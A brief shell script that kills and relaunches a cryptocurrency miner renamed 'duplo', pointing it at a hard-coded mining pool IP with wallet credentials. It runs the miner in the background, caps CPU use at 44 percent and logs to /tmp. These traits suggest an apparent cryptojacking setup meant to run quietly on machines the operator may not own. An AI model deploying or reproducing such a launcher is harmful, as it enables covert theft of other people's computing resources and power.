pkill duplo
sleep 7
duplo -o 138.201.244.38:47298 -u $WALLET --pass=$PASSWORD --rig-id=$ID -B -l /tmp/server10/duplo.log --donate-level=1 --print-time=90 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=44 --av=1 --variant -1
echo -e 'ALL WORKS! tail -f /tmp/server10/duplo.log'
